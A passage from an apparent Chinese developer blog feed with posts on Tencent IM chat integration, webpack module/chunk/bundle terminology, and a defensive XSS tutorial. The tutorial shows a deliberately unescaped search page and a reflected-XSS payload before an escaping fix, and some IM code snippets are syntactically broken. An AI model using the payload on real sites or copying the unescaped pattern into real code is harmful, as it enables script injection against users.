&#125;,</span><br></pre></td></tr></table></figure><p>利用自定义消息可以实现腾讯云文档中不包含的消息类型根据业务需求发送消息，比如实现智能客服自定义消息类型，远程消息类型等等。</p><h4 id="普通消息："><a href="#普通消息：" class="headerlink" title="普通消息："></a><strong>普通消息：</strong></h4><p>腾讯云接口文档有提供消息api,可以根据api进行消息的发送。</p><table><thead><tr><th align="left">API</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><a href="https://web.sdk.qcloud.com/im/doc/zh-cn/SDK.html#createTextMessage">createTextMessage</a></td><td align="left">创建文本消息。</td></tr><tr><td align="left"><a href="https://web.sdk.qcloud.com/im/doc/zh-cn/SDK.html#createTextAtMessage">createTextAtMessage</a></td><td align="left">创建可以附带 @ 提醒功能的文本消息。</td></tr><tr><td align="left"><a href="https://web.sdk.qcloud.com/im/doc/zh-cn/SDK.html#createImageMessage">createImageMessage</a></td><td align="left">创建图片消息。</td></tr><tr><td align="left"><a href="https://web.sdk.qcloud.com/im/doc/zh-cn/SDK.html#createAudioMessage">createAudioMessage</a></td><td align="left">创建音频消息。</td></tr><tr><td align="left"><a href="https://web.sdk.qcloud.com/im/doc/zh-cn/SDK.html#createVideoMessage">createVideoMessage</a></td><td align="left">创建视频消息。</td></tr><tr><td align="left"><a href="https://web.sdk.qcloud.com/im/doc/zh-cn/SDK.html#createCustomMessage">createCustomMessage</a></td><td align="left">创建自定义消息。</td></tr><tr><td align="left"><a href="https://web.sdk.qcloud.com/im/doc/zh-cn/SDK.html#createFaceMessage">createFaceMessage</a></td><td align="left">创建表情消息。</td></tr><tr><td align="left"><a href="https://web.sdk.qcloud.com/im/doc/zh-cn/SDK.html#createFileMessage">createFileMessage</a></td><td align="left">创建文件消息。</td></tr><tr><td align="left"><a href="https://web.sdk.qcloud.com/im/doc/zh-cn/SDK.html#createMergerMessage">createMergerMessage</a></td><td align="left">创建合并消息。</td></tr><tr><td align="left"><a href="https://web.sdk.qcloud.com/im/doc/zh-cn/SDK.html#downloadMergerMessage">downloadMergerMessage</a></td><td align="left">下载合并消息。</td></tr><tr><td align="left"><a href="https://web.sdk.qcloud.com/im/doc/zh-cn/SDK.html#sendMessage">sendMessage</a></td><td align="left">发送消息。</td></tr><tr><td align="left"><a href="https://web.sdk.qcloud.com/im/doc/zh-cn/SDK.html#revokeMessage">revokeMessage</a></td><td align="left">撤回消息。</td></tr><tr><td align="left"><a href="https://web.sdk.qcloud.com/im/doc/zh-cn/SDK.html#resendMessage">resendMessage</a></td><td align="left">重发消息。</td></tr><tr><td align="left"><a href="https://web.sdk.qcloud.com/im/doc/zh-cn/SDK.html#deleteMessage">deleteMessage</a></td><td align="left">删除消息。</td></tr></tbody></table><h3 id="会话"><a href="#会话" class="headerlink" title="会话"></a>会话</h3><h4 id="获取消息列表。"><a href="#获取消息列表。" class="headerlink" title="获取消息列表。"></a>获取消息列表。</h4><p>分页拉取指定会话的消息列表的接口，当用户进入会话首次渲染消息列表或者用户“下拉查看更多消息”时，需调用该接口。</p><p>我这里做了点击’获取更多’获取历史消息，当前页面一次只加载20条消息，提升页面加载速度。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//方法放在了vuex里，页面需要获取更多历史消息，调用vuex里的异步方法获取数据</span></span><br><span class="line">   <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * 获取消息列表</span></span><br><span class="line"><span class="comment">    * 调用时机：打开某一会话时或下拉获取历史消息时</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param <span class="type">&#123;Object&#125;</span> <span class="variable">context</span></span></span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param <span class="type">&#123;String&#125;</span> <span class="variable">conversationID</span></span></span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="function"><span class="title">getMessageList</span>(<span class="params">context, conversationID</span>)</span> &#123;</span><br><span class="line">     <span class="keyword">if</span> (context.state.isCompleted) &#123;</span><br><span class="line">       <span class="keyword">return</span></span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">const</span> &#123;</span><br><span class="line">       nextReqMessageID,</span><br><span class="line">       currentMessageList</span><br><span class="line">     &#125; = context.state</span><br><span class="line">     tim(store.state.basic.imInfo.sdkAppID).getMessageList(&#123;</span><br><span class="line">       conversationID,</span><br><span class="line">       nextReqMessageID,</span><br><span class="line">       count: <span class="number">15</span></span><br><span class="line">     &#125;).then(<span class="function"><span class="params">imReponse</span> =&gt;</span> &#123;</span><br><span class="line">       <span class="built_in">console</span>.log(<span class="string">&quot;getMessageList&quot;</span>, imReponse);</span><br><span class="line">       <span class="comment">// 更新messageID，续拉时要用到</span></span><br><span class="line">       context.state.nextReqMessageID = imReponse.data.nextReqMessageID</span><br><span class="line">       context.state.isCompleted = imReponse.data.isCompleted</span><br><span class="line">       <span class="comment">// 更新当前消息列表，从头部插入</span></span><br><span class="line">       context.state.currentMessageList = [...imReponse.data.messageList, ...currentMessageList]</span><br><span class="line">       context.state.pageList = [...imReponse.data.messageList]</span><br><span class="line">     &#125;)</span><br><span class="line">   &#125;,</span><br></pre></td></tr></table></figure><h4 id="获取会话列表。"><a href="#获取会话列表。" class="headerlink" title="获取会话列表。"></a>获取会话列表。</h4><p>获取会话列表的接口，该接口会尝试同步最新的100条会话，在同步完成后返回 SDK 内部维护的会话列表。 调用时机：需要刷新会话列表时</p><p>注意：会话保存时长跟会话最后一条消息保存时间一致，消息默认保存7天，即会话默认保存7天。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 拉取会话列表</span></span><br><span class="line"><span class="keyword">let</span> promise = tim.getConversationList();</span><br><span class="line">promise.then(<span class="function"><span class="keyword">function</span>(<span class="params">imResponse</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> conversationList = imResponse.data.conversationList; <span class="comment">// 会话列表，用该列表覆盖原有的会话列表</span></span><br><span class="line">&#125;).catch(<span class="function"><span class="keyword">function</span>(<span class="params">imError</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.warn(<span class="string">&#x27;getConversationList error:&#x27;</span>, imError); <span class="comment">// 获取会话列表失败的相关信息</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h4 id="获取会话资料。"><a href="#获取会话资料。" class="headerlink" title="获取会话资料。"></a>获取会话资料。</h4><p>获取会话资料的接口，当点击会话列表中的某个会话时，调用该接口获取会话的详细信息。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> promise = tim.getConversationProfile(conversationID);promise.then(<span class="function"><span class="keyword">function</span>(<span class="params">imResponse</span>) </span>&#123;  <span class="comment">// 获取成功  console.log(imResponse.data.conversation); // 会话资料&#125;).catch(function(imError) &#123;  console.warn(&#x27;getConversationProfile error:&#x27;, imError); // 获取会话资料失败的相关信息&#125;);</span></span><br></pre></td></tr></table></figure><h3 id="界面消息类型"><a href="#界面消息类型" class="headerlink" title="界面消息类型"></a>界面消息类型</h3><p>消息框中可以实现表情、图片、视频、文档消息发送。</p><p><img src="https://img-blog.csdnimg.cn/46b2b15f2ecf4ddaa7475cea0dac34df.png" alt="在这里插入图片描述"> </p><p><img src="https://img-blog.csdnimg.cn/641e00c18d43411fa315ed93729c4038.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0Fpb2xpbXA=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>在<code>message-item</code>中定义每一条消息的发送样式，包括头像是否显示、是否是系统消息等等。通过组件的方式，给每一种消息类型定义不同的样式。</p><p><img src="https://img-blog.csdnimg.cn/9504060c07a44a51b91f97ac06f6a886.png" alt="在这里插入图片描述"> </p><p><img src="https://img-blog.csdnimg.cn/37c7815a691045f2956e6ded65acb666.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0Fpb2xpbXA=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/fe9d4a9ec1e8490bb87e052aded2b439.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0Fpb2xpbXA=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">avatar</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.currentConversation.type === <span class="string">&quot;C2C&quot;</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">this</span>.isMine) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.sessionObj.guestAvatar;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.sessionObj.serviceAvatar;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">this</span>.currentConversation.type === <span class="string">&quot;GROUP&quot;</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">this</span>.isMine</span><br><span class="line">        ? <span class="built_in">this</span>.currentUserProfile.avatar</span><br><span class="line">        : <span class="built_in">this</span>.message.avatar;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="function"><span class="title">currentConversationType</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.currentConversation.type;</span><br><span class="line">  &#125;,<span class="comment">//头像</span></span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="title">isMine</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="comment">// console.log(this.message.from,this.imInfo.userID,this.message.from == this.imInfo.userID)</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.message.from == <span class="built_in">this</span>.sessionObj.guestImAccount;</span><br><span class="line">  &#125;,<span class="comment">//是否是自己发的消息</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="title">messagePosition</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">      [<span class="string">&quot;TIMGroupTipElem&quot;</span>, <span class="string">&quot;TIMGroupSystemNoticeElem&quot;</span>].includes(</span><br><span class="line">        <span class="built_in">this</span>.message.type</span><br><span class="line">      )</span><br><span class="line">    ) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;position-center&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.message.type == <span class="string">&quot;TIMCustomElem&quot;</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (</span><br><span class="line">        <span class="built_in">this</span>.message.payload.data.subMsgType == <span class="string">&quot;prompts&quot;</span> ||</span><br><span class="line">        <span class="built_in">this</span>.message.payload.data.subMsgType == <span class="string">&quot;transfer&quot;</span> ||</span><br><span class="line">        <span class="built_in">this</span>.message.payload.data.subMsgType == <span class="string">&quot;reception&quot;</span> ||</span><br><span class="line">        <span class="built_in">this</span>.message.payload.data.subMsgType == <span class="string">&quot;stopsession&quot;</span> ||</span><br><span class="line">      ) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;position-center&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.message.isRevoked) &#123;</span><br><span class="line">      <span class="comment">// 撤回消息</span></span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;position-center&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.isMine) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;position-right&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;position-left&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,    <span class="comment">//消息位置</span></span><br></pre></td></tr></table></figure><h3 id="智能客服会话"><a href="#智能客服会话" class="headerlink" title="智能客服会话"></a>智能客服会话</h3><p>在<code>message-item</code>中定义定义自定义消息。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 智能客服自定义热度问题 --&gt;</span><br><span class="line">&lt;custom-heatquestion</span><br><span class="line">  v-<span class="keyword">else</span>-<span class="keyword">if</span>=<span class="string">&quot;message.subMsgType === &#x27;heatquestion&#x27;&quot;</span></span><br><span class="line">  :isMine=<span class="string">&quot;isMine&quot;</span></span><br><span class="line">  :payload=<span class="string">&quot;message.msgContent&quot;</span></span><br><span class="line">  :message=<span class="string">&quot;message&quot;</span></span><br><span class="line">/&gt;</span><br><span class="line">&lt;!-- 智能客服自定义相似问题 --&gt;</span><br><span class="line">&lt;custom-similarquestion</span><br><span class="line">  v-<span class="keyword">else</span>-<span class="keyword">if</span>=<span class="string">&quot;message.subMsgType === &#x27;similarquestion&#x27;&quot;</span></span><br><span class="line">  :isMine=<span class="string">&quot;isMine&quot;</span></span><br><span class="line">  :payload=<span class="string">&quot;message.msgContent&quot;</span></span><br><span class="line">  :message=<span class="string">&quot;message&quot;</span></span><br><span class="line">/&gt;</span><br><span class="line">&lt;!-- 智能客服自定义查看指定问题 --&gt;</span><br><span class="line">&lt;custom-specifiedquestion</span><br><span class="line">  v-<span class="keyword">else</span>-<span class="keyword">if</span>=<span class="string">&quot;message.subMsgType === &#x27;specifiedquestion&#x27;&quot;</span></span><br><span class="line">  :isMine=<span class="string">&quot;isMine&quot;</span></span><br><span class="line">  :payload=<span class="string">&quot;message.msgContent&quot;</span></span><br><span class="line">  :message=<span class="string">&quot;message&quot;</span></span><br><span class="line">/&gt;</span><br></pre></td></tr></table></figure><p>界面上判断是否开启智能客服，通过维护知识库内容实现点击问题进行回答：</p><p><img src="https://img-blog.csdnimg.cn/75b09b5a991a43bea705315d8afedf29.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0Fpb2xpbXA=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/021c2af7ae084281a07423fa7a549dfd.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0Fpb2xpbXA=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>点击<strong>转人工</strong>按钮可以接通人工客服。</p><h3 id="远程控制"><a href="#远程控制" class="headerlink" title="远程控制"></a>远程控制</h3><p>远程控制功能主要以客户端插件的方式实现客服控制访客桌面，进行远程控制。</p><p>这里采用了向日葵的远程插件，使用者需要先申请创建<code>APPID</code> 和<code> APP KEY</code>。</p><p>大致流程图：</p><p>远程控制主要是客服端向访客发起，访客可以选择接受或者拒绝，并且和实时系统消息进行关联，分为远程开始、进行中、结束以及访客拒绝。</p><p><img src="https://img-blog.csdnimg.cn/c5cd062ace4843f6a5593dc6a6bf29ff.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0Fpb2xpbXA=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/677770e93c0d46148455176133d0c6f5.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0Fpb2xpbXA=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/fc0d9a80cb0a440cad593258efbf39f3.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0Fpb2xpbXA=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/7846ceb741364702a89a5b6e35f9e4e1.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0Fpb2xpbXA=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>远程进行中会进行轮巡判断当前远程是否进行，否则关闭远程。</p><p>这里主要也是以自定义消息进行远程会话，然后调用客户端方法打开插件。源码中使用了<code>external.calld</code>的方法都是调用了后端的客户端方法，需要实现的小伙伴需要和后端进行沟通。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="IM聊天" scheme="http://aiolimp.com/categories/IM%E8%81%8A%E5%A4%A9/"/>
    
    
    <category term="IM聊天" scheme="http://aiolimp.com/tags/IM%E8%81%8A%E5%A4%A9/"/>
    
  </entry>
  
  <entry>
    <title>module、chunk和bundle</title>
    <link href="http://aiolimp.com/2021/08/12/module%E3%80%81chunk%E5%92%8Cbundle/"/>
    <id>http://aiolimp.com/2021/08/12/module%E3%80%81chunk%E5%92%8Cbundle/</id>
    <published>2021-08-12T08:57:49.000Z</published>
    <updated>2023-03-05T13:32:12.212Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="module、chunk和bundle"><a href="#module、chunk和bundle" class="headerlink" title="module、chunk和bundle"></a>module、chunk和bundle</h1><h3 id="module"><a href="#module" class="headerlink" title="module"></a>module</h3><p>先看看<code>webpack</code>官方对<code>module</code>的解读：</p><blockquote><p><code>Module</code>是离散功能块，相比于完整程序提供了更小的接触面。精心编写的模块提供了可靠的抽象和封装界限，使得应用程序中每个模块都具有条理清楚的设计和明确的目的。</p></blockquote><p>其实简单来说，<code>module</code>模块就是我们编写的代码文件，比如<code>JavaScript</code>文件、<code>CSS</code>文件、<code>Image</code>文件、<code>Font</code>文件等等，它们都是属于<code>module</code>模块。而<code>module</code>模块的一个特点，就是可以被引入使用。</p><h3 id="chunk"><a href="#chunk" class="headerlink" title="chunk"></a>chunk</h3><p>同样的先看看官方解读：</p><blockquote><p>此 <code>webpack</code> 特定术语在内部用于管理捆绑过程。输出束（bundle）由块组成，其中有几种类型（例如 <code>entry</code> 和 <code>child</code> ）。通常，块直接与输出束 (<code>bundle</code>）相对应，但是，有些配置不会产生一对一的关系</p></blockquote><p>其实<code>chunk</code>是<code>webpack</code>打包过程的中间产物，<code>webpack</code>会根据文件的引入关系生成<code>chunk</code>，也就是说一个<code>chunk</code>是由一个<code>module</code>或多个<code>module</code>组成的，这取决于有没有引入其他的<code>module</code>。</p><h3 id="Bundle"><a href="#Bundle" class="headerlink" title="Bundle"></a>Bundle</h3><p>先看看官方解读：</p><blockquote><p><code>bundle</code> 由许多不同的模块生成，包含已经经过加载和编译过程的源文件的最终版本。</p></blockquote><p><code>bundle</code>其实是<code>webpack</code>的最终产物，通常来说，一个<code>bundle</code>对应这一个<code>chunk</code>。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>其实<code>module</code>、<code>chunk</code>和<code>bundle</code>可以说是同一份代码在不同转换场景的不同名称：</p><ul><li>我们编写的是<code>module</code></li><li><code>webpack</code>处理时时<code>chunk</code></li><li>最终生成供使用的是<code>bundle</code></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="webpack" scheme="http://aiolimp.com/categories/webpack/"/>
    
    
    <category term="webpack" scheme="http://aiolimp.com/tags/webpack/"/>
    
  </entry>
  
  <entry>
    <title>XSS 攻击的介绍</title>
    <link href="http://aiolimp.com/2021/08/12/%E5%A6%82%E4%BD%95%E9%98%B2%E6%AD%A2XSS%E6%94%BB%E5%87%BB/"/>
    <id>http://aiolimp.com/2021/08/12/%E5%A6%82%E4%BD%95%E9%98%B2%E6%AD%A2XSS%E6%94%BB%E5%87%BB/</id>
    <published>2021-08-12T08:57:49.000Z</published>
    <updated>2023-03-05T13:32:12.216Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="XSS-攻击的介绍"><a href="#XSS-攻击的介绍" class="headerlink" title="XSS 攻击的介绍"></a>XSS 攻击的介绍</h2><p>在开始本文之前，我们先提出一个问题，请判断以下两个说法是否正确：</p><ol><li>XSS 防范是后端 RD（研发人员）的责任，后端 RD 应该在所有用户提交数据的接口，对敏感字符进行转义，才能进行下一步操作。</li><li>所有要插入到页面上的数据，都要通过一个敏感字符过滤函数的转义，过滤掉通用的敏感字符后，就可以插入到页面中。</li></ol><p>如果你还不能确定答案，那么可以带着这些问题向下看，我们将逐步拆解问题。</p><h3 id="XSS-漏洞的发生和修复"><a href="#XSS-漏洞的发生和修复" class="headerlink" title="XSS 漏洞的发生和修复"></a>XSS 漏洞的发生和修复</h3><p>XSS 攻击是页面被注入了恶意的代码，为了更形象的介绍，我们用发生在小明同学身边的事例来进行说明。</p><h4 id="一个案例"><a href="#一个案例" class="headerlink" title="一个案例"></a>一个案例</h4><p>某天，公司需要一个搜索页面，根据 URL 参数决定关键词的内容。小明很快把页面写好并且上线。代码如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&lt;%= getParameter(&quot;</span><span class="attr">keyword</span>&quot;) %&gt;</span>&quot;&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">button</span>&gt;</span>搜索<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">  您搜索的关键词是：&lt;%= getParameter(&quot;keyword&quot;) %&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然而，在上线后不久，小明就接到了安全组发来的一个神秘链接：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xxx&#x2F;search?keyword&#x3D;&quot;&gt;&lt;script&gt;alert(&#39;XSS&#39;);&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>小明带着一种不祥的预感点开了这个链接[请勿模仿，确认安全的链接才能点开]。果然，页面中弹出了写着”XSS”的对话框。</p><blockquote><p>可恶，中招了！小明眉头一皱，发现了其中的奥秘：</p></blockquote><p>当浏览器请求 <code>http://xxx/search?keyword=&quot;&gt;&lt;script&gt;alert(&#39;XSS&#39;);&lt;/script&gt;</code> 时，服务端会解析出请求参数 <code>keyword</code>，得到 <code>&quot;&gt;&lt;script&gt;alert(&#39;XSS&#39;);&lt;/script&gt;</code>，拼接到 HTML 中返回给浏览器。形成了如下的 HTML：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">&#x27;XSS&#x27;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>&quot;&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">button</span>&gt;</span>搜索<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">  您搜索的关键词是：&quot;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">&#x27;XSS&#x27;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>浏览器无法分辨出 <code>&lt;script&gt;alert(&#39;XSS&#39;);&lt;/script&gt;</code> 是恶意代码，因而将其执行。</p><p>这里不仅仅 div 的内容被注入了，而且 input 的 value 属性也被注入， alert 会弹出两次。</p><p>面对这种情况，我们应该如何进行防范呢？</p><p>其实，这只是浏览器把用户的输入当成了脚本进行了执行。那么只要告诉浏览器这段内容是文本就可以了。</p><p>聪明的小明很快找到解决方法，把这个漏洞修复：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&lt;%= escapeHTML(getParameter(&quot;</span><span class="attr">keyword</span>&quot;)) %&gt;</span>&quot;&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">button</span>&gt;</span>搜索<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">  您搜索的关键词是：&lt;%= escapeHTML(getParameter(&quot;keyword&quot;)) %&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>escapeHTML()</code> 按照如下规则进行转义：</p><p>|字符|转义后的字符| |-|-| |<code>&amp;</code>|<code>&amp;</code>| |<code>&lt;</code>|<code>&lt;</code>| |<code>&gt;</code>|<code>&gt;</code>| |<code>&quot;</code>|<code>&quot;</code>| |<code>&#39;</code>|<code>&#39;</code>| |<code>/</code>|<code>/</code>|</p><p>经过了转义函数的处理后，最终浏览器接收到的响应为：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span 